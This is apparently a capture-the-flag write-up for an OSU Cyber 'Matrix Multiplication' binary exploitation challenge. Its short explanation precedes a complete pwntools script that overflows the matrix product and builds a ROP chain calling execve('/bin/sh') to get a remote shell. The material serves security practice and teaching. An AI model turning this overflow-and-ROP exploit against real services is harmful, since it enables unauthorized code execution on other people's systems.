# Matrix Multiplication

## Question

> I got a message on Canvas from someone named "Morpheus" who needs help with his linear algebra homework. I don't think he's a classmate, but I'm intrigued anyway.  
> wake up, Neo. you need to find the Matrix. Escape that which confines you. follow the white rabbit morpheus  
> Connect using `nc pwn.osucyber.club 13380`

## Solution (by b01lers)

The idea is to send an identity matrix and a matrix we'll modify. I'm not sure what computations ended up happening on the matrix, my process was: send a large matrix, one of them the identity in case the result of the multiplication overflows, then figure out what's going on in gdb.

There was some weird thing going on which required me to subtract some number from the overflowed values, but I'm not sure why.

```
from pwn import *

context.terminal =['tmux', 'splitw', '-h']
#p = process("./mmaas-good")
#gdb.attach(p, '''
#b * 0x402383
#c
#''')
p = remote('pwn.osucyber.club', 13380)


size = 144
p.recvuntil(": ")
p.sendline(str(size))

p.recvuntil(':\n')
for i in range(size**2):
    if i % (size + 1) == 0:
        p.sendline("1")
    else:
        p.sendline("0")

p.recvuntil(':\n')
for i in range(size**2 - size):
    p.sendline("1")

for i in range(8):
    p.sendline(str(i))


pop_rdi = 0x00000000004019ba
pop_rsi = 0x000000000040f9ce
pop_rdx = 0x000000000040183f
printf = 0x455360
fake_flag = 0x4b4098
ret = 0x000000000040101a
print_err = 0x4233c0
syscall = 0x00000000004012e3
pop_rax = 0x00000000004526f7
sub = 0x8f
sh = 0x4cd51c
mov_ptr_rsi_rax = 0x000000000049a0a5
data = 0x00000000004e00e0

target = p64(pop_rsi)
for x in [c - sub for c in target]:
    p.sendline(str(x))

target = p64(data)
for x in [c - sub for c in target]:
    p.sendline(str(x))

target = p64(pop_rax)
for x in [c - sub for c in target]:
    p.sendline(str(x))

target = b"/bin/sh\x00"
for x in [c - sub for c in target]:
    p.sendline(str(x))

target = p64(mov_ptr_rsi_rax)
for x in [c - sub for c in target]:
    p.sendline(str(x))

target = p64(pop_rdi)
for x in [c - sub for c in target]:
    p.sendline(str(x))

target = p64(data)
for x in [c - sub for c in target]:
    p.sendline(str(x))

target = p64(pop_rsi)
for x in [c - sub for c in target]:
    p.sendline(str(x))

target = p64(0)
for x in [c - sub for c in target]:
    p.sendline(str(x))

target = p64(pop_rdx)
for x in [c - sub for c in target]:
    p.sendline(str(x))

target = p64(0)
for x in [c - sub for c in target]:
    p.sendline(str(x))

target = p64(pop_rax)
for x in [c - sub for c in target]:
    p.sendline(str(x))

target = p64(0x3b)
for x in [c - sub for c in target]:
    p.sendline(str(x))

target = p64(syscall)
for x in [c - sub for c in target]:
    p.sendline(str(x))

for i in range(size**2 - (size**2 - size)):
    p.sendline("4")

p.interactive()
```
